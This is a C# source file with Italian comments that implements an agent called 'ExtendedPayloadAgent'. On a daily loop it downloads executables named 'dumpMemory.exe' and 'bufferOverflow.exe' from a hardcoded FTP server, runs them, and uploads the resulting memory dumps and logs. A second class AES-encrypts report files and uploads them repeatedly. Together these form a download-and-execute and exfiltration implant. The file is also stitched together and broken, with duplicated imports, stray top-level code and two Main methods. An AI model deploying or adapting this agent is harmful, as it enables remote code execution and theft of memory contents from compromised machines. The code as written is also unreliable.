using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net.Sockets;
using System.Text;
using System;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.Net.Sockets;
using System.Text;


class ExtendedPayloadAgent
{
    static string ftpServerUri = "ftp://192.168.1.100";
    static string username = "user";
    static string password = "password";

    // Payload da scaricare e lanciare (esempio: dumpMemory.exe)
    static string[] payloads = { "dumpMemory.exe", "bufferOverflow.exe" };
    static string localDir = @"C:\Temp\Payloads";
    static string logFile = Path.Combine(localDir, "agent_log.txt");

    static void Main()
    {
        Directory.CreateDirectory(localDir);
        Log("Agent started.");

        while (true)
        {
            foreach (var payload in payloads)
            {
                string ftpUri = $"{ftpServerUri}/{payload}";
                string localPath = Path.Combine(localDir, payload);

                Log($"Scarico payload: {payload}");
                if (DownloadPayload(ftpUri, localPath))
                {
                    Log("Download completo. Avvio esecuzione...");
                    ExecutePayload(localPath);

                    Log("Esecuzione terminata, carico report...");
                    UploadReport(localDir);
                }
                else
                {
                    Log("Download fallito.");
                }
            }

            // Attende 24h
            Thread.Sleep(86400000);
        }
    }

    static void Log(string message)
    {
        string logEntry = $"{DateTime.Now} {message}";
        Console.WriteLine(logEntry);
        File.AppendAllText(logFile, logEntry + Environment.NewLine);
    }

    static bool DownloadPayload(string uri, string localPath)
    {
        try
        {
            WebClient client = new WebClient
            {
                Credentials = new NetworkCredential(username, password)
            };
            client.DownloadFile(uri, localPath);
            return true;
        }
        catch (Exception ex)
        {
            Log("Errore download: " + ex.Message);
            return false;
        }
    }

    static void ExecutePayload(string path)
    {
        try
        {
            Process p = Process.Start(path);
            p.WaitForExit(60000); // Attende max 60 sec
            Log($"Payload {Path.GetFileName(path)} eseguito, exit code: {p.ExitCode}");
        }
        catch (Exception ex)
        {
            Log("Errore esecuzione: " + ex.Message);
        }
    }

    static void UploadReport(string reportFolder)
    {
        // Post-condizione: i payload ops creano eventualmente file dump memory/log .bin/.txt nel folder
        string[] reports = Directory.GetFiles(reportFolder, "*.bin");
        if (reports.Length == 0) reports = Directory.GetFiles(reportFolder, "*.txt");

        WebClient client = new WebClient();
        client.Credentials = new NetworkCredential(username, password);

        foreach (var file in reports)
        {
            try
            {
                string ftpUri = $"{ftpServerUri}/uploads/{Path.GetFileName(file)}";
                Log($"Upload report: {file}");
                client.UploadFile(ftpUri, file);
                File.Delete(file); // Pulisce dopo upload
                Log("Upload report completato");
            }
            catch (Exception ex)
            {
                Log("Errore upload report: " + ex.Message);
            }
        }
    }
}
/*semplice server FTP in C# che accetta connessioni e upload file. Per uso avanzato si può estendere con autenticazione, gestione directory, download file*/
/*permette di caricare (upload) file di tutte le estensioni al server*/

/*Esempio di upload file via FTP*/
// Retry e logging senza password in chiaro
// Esempio di log sicuro
public static void SafeLog(string message)
{
    string logPath = "agent_log.txt";
    string password = "s3cr3t"; // Example sensitive data
    string safeMsg = message.Replace(password, "***");
    File.AppendAllText(logPath, $"{DateTime.UtcNow:o} {safeMsg}\n");
}
/*Esempio di log sicuro*/
SafeLog("Payload uploaded successfully");


// Funzioni di utilità per crittografia, logging e compressione
// Funzioni di utilità per crittografia, logging e compressione

public class FtpCryptoUploader
{
    public static void UploadEncryptedReport(string localFilePath, string ftpUri, byte[] aesKey, byte[] aesIV)
    {
        byte[] plainData = File.ReadAllBytes(localFilePath);
        byte[] encryptedData = AesEncrypt(plainData, aesKey, aesIV);

        string tempFile = localFilePath + ".enc";
        File.WriteAllBytes(tempFile, encryptedData);

        WebClient client = new WebClient();
        // You need to define 'username' and 'password' variables or pass them as parameters
        // Example:
        // client.Credentials = new NetworkCredential("yourUsername", "yourPassword");
        client.UploadFile(ftpUri, tempFile);

        File.Delete(tempFile);
    }
    static void Main()
    {
        string localReportPath = "report.txt";
        string ftpUri = "ftp://server/upload/report.enc";
        byte[] aesKey = Convert.FromBase64String("your_base64_encoded_key"); // 16/24/32 bytes key
        byte[] aesIv = Convert.FromBase64String("your_base64_encoded_iv");   // 16 bytes IV
        int maxRetries = 3;
        int retryDelayMs = 2000;

        while (true)
        {
            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    UploadEncryptedReport(localReportPath, ftpUri, aesKey, aesIv);
                    Log("Report uploaded successfully");
                    break;
                }
                catch (Exception ex)
                {
                    Log($"Upload attempt {attempt + 1} failed: {ex.Message}");
                    Thread.Sleep(retryDelayMs);
                }
            }
            Thread.Sleep(60000); // Wait before next upload
        }
    }
    // Funzione AES per cifrare/decifrare un byte array con chiave e IV
    public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new();
        using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }
    public static byte[] AesDecrypt(byte[] cipherText, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new(cipherText);
        using CryptoStream cryptoStream = new(ms, aes.CreateDecryptor(), CryptoStreamMode.Read);
        using MemoryStream resultStream = new();
        cryptoStream.CopyTo(resultStream);
        return resultStream.ToArray();
    }
    // Esempio di log sicuro
    public static void Log(string message)
    {
        string logPath = "agent_log.txt";
        string password = "s3cr3t"; // Example sensitive data
        string safeMsg = message.Replace(password, "***");
        File.AppendAllText(logPath, $"{DateTime.UtcNow:o} {safeMsg}\n");
    }
}